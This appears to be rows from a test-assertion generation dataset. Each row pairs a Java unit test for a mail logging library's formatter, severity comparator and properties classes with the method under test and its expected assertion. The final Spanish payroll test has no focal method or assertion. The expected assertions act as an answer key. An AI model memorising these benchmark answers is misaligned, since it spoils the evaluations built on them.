format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertEquals(LINE_SEP, result)
"testFormatMessageNullRecordMessage() { LogRecord record = new LogRecord(Level.SEVERE, (String) null); Throwable t = new Throwable(record.getMessage()); StackTraceElement frame = new StackTraceElement(""java.lang.String"", ""getBytes"", ""String.java"", 913); t.setStackTrace(new StackTraceElement[]{frame}); record.setThrown(t); CompactFormatter cf = new CompactFormatter(""%7$#s""); String result = cf.format(record); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	"assertEquals(""null|Throwable String.getBytes(:913)"", result)"
"testFormatLevelNull() { CompactFormatter cf = new CompactFormatter(""%4$s""); ""<AssertPlaceHolder>""; }
formatLevel(final LogRecord record) { return record.getLevel().getLocalizedName(); }"	assertNotNull(cf.formatLevel((LogRecord) null))
"testFormatLoggerNull() { CompactFormatter cf = new CompactFormatter(""%3$s""); ""<AssertPlaceHolder>""; }
formatLoggerName(final LogRecord record) { return simpleClassName(record.getLoggerName()); }"	assertNotNull(cf.formatLoggerName((LogRecord) null))
"testFormatNull() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(cf.format((LogRecord) null))
"testFormatResourceBundleName() { CompactFormatter cf = new CompactFormatter(""%15$s""); LogRecord r = new LogRecord(Level.SEVERE, """"); r.setResourceBundleName(""name""); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertEquals(r.getResourceBundleName(), output)
"testFormatSequence() { CompactFormatter cf = new CompactFormatter(""%9$d""); LogRecord record = new LogRecord(Level.SEVERE, """"); String output = cf.format(record); String expect = Long.toString(record.getSequenceNumber()); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertEquals(expect, output)
"testFormatParameterSimpleName() { CompactFormatter cf = new CompactFormatter(""%5$s""); LogRecord r = new LogRecord(Level.SEVERE, cf.getClass().getName() + "" {0},{1},{2}""); r.setParameters(new Object[]{null, """", cf}); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	"assertTrue(output, output.startsWith( ""CompactFormatter null,,CompactFormatter@""))"
"testFormatSourceNull() { CompactFormatter cf = new CompactFormatter(""%2$s""); ""<AssertPlaceHolder>""; }
formatSource(final LogRecord record) { String source = record.getSourceClassName(); if (source != null) { if (record.getSourceMethodName() != null) { source = simpleClassName(source) + "" "" + record.getSourceMethodName(); } else { source = simpleClassName(source); } } else { source = simpleClassName(record.getLoggerName()); } return source; }"	assertNotNull(cf.formatSource((LogRecord) null))
"testFormatThrownNullRecord() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
formatThrown(final LogRecord record) { String msg; final Throwable t = record.getThrown(); if (t != null) { String site = formatBackTrace(record); msg = formatMessage(t) + (isNullOrSpaces(site) ? """" : ' ' + site); } else { msg = """"; } return msg; }"	assertNotNull(cf.formatThrown((LogRecord) null))
"testFormatThreadIDNull() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
formatThreadID(final LogRecord record) { Long id = LogManagerProperties.getLongThreadID(record); if (id == null) { id = Integer.toUnsignedLong(record.getThreadID()); } return id; }"	assertNotNull(cf.formatThreadID((LogRecord) null))
"testFormatErrorNull() { CompactFormatter cf = new CompactFormatter(""%11$s""); ""<AssertPlaceHolder>""; }
formatError(final LogRecord record) { return formatMessage(record.getThrown()); }"	assertNotNull(cf.formatError((LogRecord) null))
"testFormatExample1() { String p = ""%7$#.160s%n""; LogRecord r = new LogRecord(Level.SEVERE, ""Encoding failed.""); RuntimeException npe = new NullPointerException(); StackTraceElement frame = new StackTraceElement(""java.lang.String"", ""getBytes"", ""String.java"", 913); npe.setStackTrace(new StackTraceElement[]{frame}); r.setThrown(npe); CompactFormatter cf = new CompactFormatter(p); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(output)
"testFormatExample2() { String p = ""%7$#.20s%n""; LogRecord r = new LogRecord(Level.SEVERE, ""Encoding failed.""); RuntimeException npe = new NullPointerException(); StackTraceElement frame = new StackTraceElement(""java.lang.String"", ""getBytes"", ""String.java"", 913); npe.setStackTrace(new StackTraceElement[]{frame}); r.setThrown(npe); CompactFormatter cf = new CompactFormatter(p); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(output)
"testFormatExample3() { String p = ""%1$tc %2$s%n%4$s: %5$s%6$s%n""; LogRecord r = new LogRecord(Level.SEVERE, ""Encoding failed.""); r.setSourceClassName(""MyClass""); r.setSourceMethodName(""fatal""); setEpochMilli(r, 1258723764000L); RuntimeException npe = new NullPointerException(); StackTraceElement frame = new StackTraceElement(""java.lang.String"", ""getBytes"", ""String.java"", 913); npe.setStackTrace(new StackTraceElement[]{frame}); r.setThrown(npe); CompactFormatter cf = new CompactFormatter(p); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(output)
"testFormatExample4() { String p = ""%4$s: %12$#.160s%n""; LogRecord r = new LogRecord(Level.SEVERE, ""Unable to send notification.""); r.setSourceClassName(""MyClass""); r.setSourceMethodName(""fatal""); setEpochMilli(r, 1258723764000L);  Exception t = new SocketException(""Permission denied: connect""); t = new MessagingException(""Couldn't connect to host"", t); r.setThrown(t); CompactFormatter cf = new CompactFormatter(p); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(output)
"testFormatExample5() { String p = ""[%9$d][%1$tT][%10$d][%2$s] %5$s%n%6$s%n""; LogRecord r = new LogRecord(Level.SEVERE, ""Unable to send notification.""); r.setSequenceNumber(125); setIntThreadID(r, 38); r.setSourceClassName(""MyClass""); r.setSourceMethodName(""fatal""); setEpochMilli(r, 1248203502449L);  Exception t = new SocketException(""Permission denied: connect"");  StackTraceElement frame = new StackTraceElement( ""org.eclipse.angus.mail.smtp.SMTPTransport"", ""openServer"", ""SMTPTransport.java"", 1949); t.setStackTrace(new StackTraceElement[]{frame});  t = new MessagingException(""Couldn't connect to host"", t); r.setThrown(t); CompactFormatter cf = new CompactFormatter(p); String output = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(output)
"testFormatBackTraceNull() { CompactFormatter cf = new CompactFormatter(""%14$s""); ""<AssertPlaceHolder>""; }
formatBackTrace(final LogRecord record) { String site = """"; final Throwable t = record.getThrown(); if (t != null) { final Throwable root = apply(t); StackTraceElement[] trace = root.getStackTrace(); site = findAndFormat(trace); if (isNullOrSpaces(site)) { int limit = 0; for (Throwable c = t; c != null; c = c.getCause()) { StackTraceElement[] ste = c.getStackTrace(); site = findAndFormat(ste); if (!isNullOrSpaces(site)) { break; } else { if (trace.length == 0) { trace = ste; } }  //Deal with excessive cause chains //and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } }  //Punt. if (isNullOrSpaces(site) && trace.length != 0) { site = formatStackTraceElement(trace[0]); } } } return site; }"	assertNotNull(cf.formatBackTrace((LogRecord) null))
"testApplyNull() { ""<AssertPlaceHolder>""; }
apply(final Throwable t) { return SeverityComparator.getInstance().apply(t); }"	assertNull(new CompactFormatter().apply(null))
"testApplyEvil() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
apply(final Throwable t) { return SeverityComparator.getInstance().apply(t); }"	assertNotNull(cf.apply(createEvilThrowable()))
"testIgnoreNull() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertNotNull(cf.ignore((StackTraceElement) null))
"testIgnoreKnownClass() { CompactFormatter cf = new CompactFormatter(); String n = cf.getClass().getName(); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""format"", f, 20); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertFalse(s.toString(), cf.ignore(s))
"testIgnoreUnknownClass() { CompactFormatter cf = new CompactFormatter(); String n = UNKNOWN_CLASS_NAME; String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""format"", f, 20); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertFalse(s.toString(), cf.ignore(s))
"testIgnoreStaticUtilityClass() { CompactFormatter cf = new CompactFormatter(); String n = MimeUtility.class.getName(); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""encodeText"", f, 400); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreStaticUtilityClass_Util() { CompactFormatter cf = new CompactFormatter(); String n = getClass().getName().concat(""MimeUtility""); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""encodeText"", f, 400); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreStaticUtilityClass_s() { CompactFormatter cf = new CompactFormatter(); String n = getClass().getName().concat(""Collections""); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""nCopies"", f, 400); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreStaticUtilityClass_es() { CompactFormatter cf = new CompactFormatter(); String n = getClass().getName().concat(""Properties""); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""get"", f, 400); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertFalse(s.toString(), cf.ignore(s))
"testIgnoreStaticUtilityClass_Throwables() { CompactFormatter cf = new CompactFormatter(); String n = getClass().getName().concat(""Throwables""); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""propagate"", f, 400); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreSyntheticMethod() { CompactFormatter cf = new CompactFormatter(); String n = UNKNOWN_CLASS_NAME; String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""access$100"", f, 10); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreNativeMethod() { CompactFormatter cf = new CompactFormatter(); String n = UNKNOWN_CLASS_NAME; String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""foo"", f, -2); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreReflectMethod() { CompactFormatter cf = new CompactFormatter(); String n = java.lang.reflect.Method.class.getName(); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""invoke"", f, 10); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreReflectMethodApiError() { CompactFormatter cf = new CompactFormatter(); String n = ""java.lang.reflect."".concat(getClass().getName()); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""invoke"", f, 10); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreReflectMethodSunError() { CompactFormatter cf = new CompactFormatter(); String n = ""sun.reflect."".concat(getClass().getName()); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""invoke"", f, 10); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreReflectConstructor() { CompactFormatter cf = new CompactFormatter(); String n = java.lang.reflect.Constructor.class.getName(); String f = n.concat("".java""); StackTraceElement s = new StackTraceElement(n, ""newInstance"", f, 10); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testIgnoreUnknownLine() { CompactFormatter cf = new CompactFormatter(); String n = UNKNOWN_CLASS_NAME; StackTraceElement s = new StackTraceElement(n, ""foo"", null, -1); ""<AssertPlaceHolder>""; }
ignore(final StackTraceElement s) { return isUnknown(s) || defaultIgnore(s); }"	assertTrue(s.toString(), cf.ignore(s))
"testToAlternate() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
toAlternate(final String s) { return s != null ? s.replaceAll(""[\\x00-\\x1F\\x7F]+"", """") : null; }"	"assertEquals("""", cf.toAlternate(LINE_SEP))"
"testToAlternateNull() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
toAlternate(final String s) { return s != null ? s.replaceAll(""[\\x00-\\x1F\\x7F]+"", """") : null; }"	assertNull(cf.toAlternate((String) null))
"Exception { double millis = 0L; final int records = 3; final int duration = 40; Level lvl = Level.INFO; DurationFilter sf = new DurationFilter(records, duration); LogRecord r;  double period = duration / (double) records; for (int i = 0; i < (duration * records) * 2; i++) { r = new LogRecord(lvl, Double.toString(millis)); setEpochMilli(r, (long) millis); ""<AssertPlaceHolder>""; millis = millis + Math.ceil(period); } }
isLoggable(final LogRecord record) { return accept(record.getMillis()); }"	assertTrue(Integer.toString(i), sf.isLoggable(r))
"Exception { String host = LogManagerPropertiesTest.class.getName(); Properties p = new Properties(); p.setProperty(""mail.smtp.localhost"", host); Session s = Session.getInstance(p); Transport t = s.getTransport(InternetAddress.getLocalAddress(s)); try { String h = LogManagerProperties.getLocalHost(t); if (h != null || isPrivateSpec(t.getClass())) { Assert.""<AssertPlaceHolder>""; } } catch (NoSuchMethodException notOfficial) { if (isPrivateSpec(t.getClass())) { fail(t.toString()); } } }
getLocalHost(final Object s) throws Exception { Objects.requireNonNull(s); try { final Method m = s.getClass().getMethod(""getLocalHost""); if (!Modifier.isStatic(m.getModifiers()) && m.getReturnType() == String.class) { return (String) m.invoke(s); } else { throw new NoSuchMethodException(m.toString()); } } catch (final ExceptionInInitializerError EIIE) { throw wrapOrThrow(EIIE); } catch (final InvocationTargetException ite) { throw paramOrError(ite); } }"	assertEquals(host, h)
"Exception { Session session = Session.getInstance(new Properties()); Service svc = new NotAllowedService(session); try { LogManagerProperties.getLocalHost(svc); } catch (SecurityException allowed) { } catch (InvocationTargetException expect) { Assert.""<AssertPlaceHolder>""; } }
getLocalHost(final Object s) throws Exception { Objects.requireNonNull(s); try { final Method m = s.getClass().getMethod(""getLocalHost""); if (!Modifier.isStatic(m.getModifiers()) && m.getReturnType() == String.class) { return (String) m.invoke(s); } else { throw new NoSuchMethodException(m.toString()); } } catch (final ExceptionInInitializerError EIIE) { throw wrapOrThrow(EIIE); } catch (final InvocationTargetException ite) { throw paramOrError(ite); } }"	assertTrue(expect.getCause() instanceof SecurityException)
"Exception { String prefix = LogManagerPropertiesTest.class.getName(); Properties parent = new Properties(); LogManagerProperties mp = new LogManagerProperties(parent, prefix); String key = ""key""; Object value = new Object(); parent.put(key, value);  ""<AssertPlaceHolder>""; }
get(final Object key) { Object value; if (key instanceof String) { value = getProperty((String) key); } else { value = null; }  //Search for non-string value. if (value == null) { value = defaults.get(key); if (value == null && !defaults.containsKey(key)) { value = super.get(key); } } return value; }"	assertEquals(parent.get(key), mp.get(key))
"Exception { String prefix = LogManagerPropertiesTest.class.getName(); Properties parent = new Properties(); LogManagerProperties mp = new LogManagerProperties(parent, prefix); String key = ""key""; Object value = new Object(); parent.put(key, value); ""<AssertPlaceHolder>""; }
containsKey(final Object key) { boolean found = key instanceof String && getProperty((String) key) != null; if (!found) { found = defaults.containsKey(key) || super.containsKey(key); } return found; }"	assertEquals(parent.containsKey(key), mp.containsKey(key))
"testHashCode() { CompactFormatter cf = new CompactFormatter(); ""<AssertPlaceHolder>""; }
hashCode() { return getClass().hashCode() + name.hashCode(); }"	assertEquals(System.identityHashCode(cf), cf.hashCode())
"testPublishNull() { MailHandler instance = new MailHandler(); InternalErrorManager em = new InternalErrorManager(); instance.setErrorManager(em); instance.setLevel(Level.ALL); instance.publish((LogRecord) null); instance.close(); for (Throwable t : em.exceptions) { dump(t); } ""<AssertPlaceHolder>""; }
close() { checkAccess(); try { Message msg = null; synchronized (this) { try { msg = writeLogRecords(ErrorManager.CLOSE_FAILURE); } finally {  //Change level after formatting. this.logLevel = Level.OFF; this.disabledLevel = null; //free reference /** * The sign bit of the capacity is set to ensure that * records that have passed isLoggable, but have yet to be * added to the internal buffer, are immediately pushed as * an email. */ if (this.capacity > 0) { this.capacity = -this.capacity; }  //Only need room for one record after closed //Ensure not inside a push. if (size == 0 && data.length != 1) { initLogRecords(1); } } }  if (msg != null) { send(msg, false, ErrorManager.CLOSE_FAILURE); } } catch (final LinkageError JDK8152515) { reportLinkageError(JDK8152515, ErrorManager.CLOSE_FAILURE); } catch (final ServiceConfigurationError sce) { reportConfigurationError(sce, ErrorManager.CLOSE_FAILURE); } }"	assertTrue(em.exceptions.isEmpty())
"testApplyNull() { SeverityComparator a = new SeverityComparator(); ""<AssertPlaceHolder>""; }
apply(final Throwable chain) { //Matches the j.u.f.UnaryOperator<Throwable> interface. int limit = 0; Throwable root = chain; Throwable high = null; Throwable normal = null; for (Throwable cause = chain; cause != null; cause = cause.getCause()) { root = cause;  //Find the deepest cause.  //Find the deepest normal occurrance. if (isNormal(cause)) { normal = cause; }  //Find the deepest error that happened before a normal occurrance. if (normal == null && cause instanceof Error) { high = cause; }  //Deal with excessive cause chains and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } } return high != null ? high : normal != null ? normal : root; }"	assertNull(a.apply(null))
"testApplyErrorByNormal() { SeverityComparator a = new SeverityComparator(); Throwable next = this.headIeChain(new AssertionError()); next = new Error(next); next = new NoClassDefFoundError().initCause(next); Throwable reduced = a.apply(next); ""<AssertPlaceHolder>""; }
apply(final Throwable chain) { //Matches the j.u.f.UnaryOperator<Throwable> interface. int limit = 0; Throwable root = chain; Throwable high = null; Throwable normal = null; for (Throwable cause = chain; cause != null; cause = cause.getCause()) { root = cause;  //Find the deepest cause.  //Find the deepest normal occurrance. if (isNormal(cause)) { normal = cause; }  //Find the deepest error that happened before a normal occurrance. if (normal == null && cause instanceof Error) { high = cause; }  //Deal with excessive cause chains and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } } return high != null ? high : normal != null ? normal : root; }"	assertEquals(Error.class, reduced.getClass())
"testApplyProxyNormal() { //UTE->IE->AE = IE SeverityComparator a = new SeverityComparator(); Throwable next = this.headIeChain(new AssertionError()); next = new UndeclaredThrowableException(next); Throwable reduced = a.apply(next); ""<AssertPlaceHolder>""; }
apply(final Throwable chain) { //Matches the j.u.f.UnaryOperator<Throwable> interface. int limit = 0; Throwable root = chain; Throwable high = null; Throwable normal = null; for (Throwable cause = chain; cause != null; cause = cause.getCause()) { root = cause;  //Find the deepest cause.  //Find the deepest normal occurrance. if (isNormal(cause)) { normal = cause; }  //Find the deepest error that happened before a normal occurrance. if (normal == null && cause instanceof Error) { high = cause; }  //Deal with excessive cause chains and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } } return high != null ? high : normal != null ? normal : root; }"	assertEquals(InterruptedException.class, reduced.getClass())
"testApplyReflectNormal() { //ITE->IE->AE = IE SeverityComparator a = new SeverityComparator(); Throwable next = this.headIeChain(new AssertionError()); next = new InvocationTargetException(next); Throwable reduced = a.apply(next); ""<AssertPlaceHolder>""; }
apply(final Throwable chain) { //Matches the j.u.f.UnaryOperator<Throwable> interface. int limit = 0; Throwable root = chain; Throwable high = null; Throwable normal = null; for (Throwable cause = chain; cause != null; cause = cause.getCause()) { root = cause;  //Find the deepest cause.  //Find the deepest normal occurrance. if (isNormal(cause)) { normal = cause; }  //Find the deepest error that happened before a normal occurrance. if (normal == null && cause instanceof Error) { high = cause; }  //Deal with excessive cause chains and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } } return high != null ? high : normal != null ? normal : root; }"	assertEquals(InterruptedException.class, reduced.getClass())
"testApplyNormalByNormal() { //EE->IIOE->E->IE->AE = IE SeverityComparator a = new SeverityComparator(); Throwable next = this.headIeChain(new AssertionError()); next = new Error(next); next = this.headIioeChain(next); next = new ExecutionException(next); Throwable reduced = a.apply(next); ""<AssertPlaceHolder>""; }
apply(final Throwable chain) { //Matches the j.u.f.UnaryOperator<Throwable> interface. int limit = 0; Throwable root = chain; Throwable high = null; Throwable normal = null; for (Throwable cause = chain; cause != null; cause = cause.getCause()) { root = cause;  //Find the deepest cause.  //Find the deepest normal occurrance. if (isNormal(cause)) { normal = cause; }  //Find the deepest error that happened before a normal occurrance. if (normal == null && cause instanceof Error) { high = cause; }  //Deal with excessive cause chains and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } } return high != null ? high : normal != null ? normal : root; }"	assertEquals(InterruptedException.class, reduced.getClass())
"testApplyFindsRootCause() { /** * Lots of frameworks wrap exceptions with runtime exceptions. The root * cause is always more important. */ SeverityComparator a = new SeverityComparator(); final Throwable root = new Exception(); Throwable next = root; for (int i = 0; i < 7; i++) { next = new RuntimeException(next); } Throwable reduced = a.apply(next); ""<AssertPlaceHolder>""; }
apply(final Throwable chain) { //Matches the j.u.f.UnaryOperator<Throwable> interface. int limit = 0; Throwable root = chain; Throwable high = null; Throwable normal = null; for (Throwable cause = chain; cause != null; cause = cause.getCause()) { root = cause;  //Find the deepest cause.  //Find the deepest normal occurrance. if (isNormal(cause)) { normal = cause; }  //Find the deepest error that happened before a normal occurrance. if (normal == null && cause instanceof Error) { high = cause; }  //Deal with excessive cause chains and cyclic throwables. if (++limit == (1 << 16)) { break; //Give up. } } return high != null ? high : normal != null ? normal : root; }"	assertEquals(root, reduced)
"testApplyThenCompareNull() { SeverityComparator a = new SeverityComparator(); ""<AssertPlaceHolder>""; }
applyThenCompare(Throwable tc1, Throwable tc2) { return tc1 == tc2 ? 0 : compareThrowable(apply(tc1), apply(tc2)); }"	assertEquals(0, a.applyThenCompare((Throwable) null, (Throwable) null))
"testIsNormalDoesNotUseApply() { SeverityComparator a = new SeverityComparator(); Throwable next = this.headIeChain(new AssertionError()); next = new Error(next); next = this.headIioeChain(next); next = new ExecutionException(next); ""<AssertPlaceHolder>""; }
isNormal(final Throwable t) { if (t == null) { //This is only needed when called directly. return false; }  /** * Use the class names to avoid loading more classes. */ final Class<?> root = Throwable.class; final Class<?> error = Error.class; for (Class<?> c = t.getClass(); c != root; c = c.getSuperclass()) { if (error.isAssignableFrom(c)) { if (c.getName().equals(""java.lang.ThreadDeath"")) { return true; } } else { //Interrupt, Interrupted or Interruption. if (c.getName().contains(""Interrupt"")) { return true; } } } return false; }"	assertFalse(a.isNormal(next))
"testIsNormalNull() { SeverityComparator a = new SeverityComparator(); ""<AssertPlaceHolder>""; }
isNormal(final Throwable t) { if (t == null) { //This is only needed when called directly. return false; }  /** * Use the class names to avoid loading more classes. */ final Class<?> root = Throwable.class; final Class<?> error = Error.class; for (Class<?> c = t.getClass(); c != root; c = c.getSuperclass()) { if (error.isAssignableFrom(c)) { if (c.getName().equals(""java.lang.ThreadDeath"")) { return true; } } else { //Interrupt, Interrupted or Interruption. if (c.getName().contains(""Interrupt"")) { return true; } } } return false; }"	assertFalse(a.isNormal((Throwable) null))
"liquidarTest() { Empleado pepe = new PlantaTemporaria(80, 0, true); Empleado pedro = new PlantaPermanente(80, 2, true, 6); Empleado ana = new PlantaPermanente(160, 0, false, 4); Empleado raul = new Gerente(160, 1, true, 10);  Empresa acme = new Empresa(10);  acme.agregarEmpleado(raul); acme.agregarEmpleado(pepe); acme.agregarEmpleado(pedro); acme.agregarEmpleado(ana);  double esperado = 1554000 ; double obtenido = acme.montoTotal(); ""<AssertPlaceHolder>"";  }
